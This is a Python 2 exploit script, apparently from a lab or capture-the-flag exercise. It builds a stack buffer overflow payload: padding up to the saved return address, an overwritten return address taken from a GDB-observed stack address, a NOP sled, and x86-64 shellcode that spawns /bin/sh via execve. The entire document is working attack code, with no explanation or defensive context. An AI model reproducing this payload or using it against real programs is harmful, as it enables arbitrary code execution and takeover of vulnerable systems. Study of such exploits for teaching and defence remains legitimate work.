#!/usr/bin/env python2

import binascii
import time

if False:  # Set this to True to play with GDB
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass

bytes_to_ret_addr = 72  # observed with GDB
nop_sled_size = 128
buf_addr = 0x00007fffffffe810  # observed with GDB
ret_addr = buf_addr + bytes_to_ret_addr + 8 + nop_sled_size / 2
ret_addr_str = "%016x" % ret_addr
content = 'A' * (bytes_to_ret_addr/2)
content += '\00' * (bytes_to_ret_addr/2)
content += binascii.unhexlify(ret_addr_str)[::-1]
content += '\x90' * nop_sled_size
content += "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
print(content)
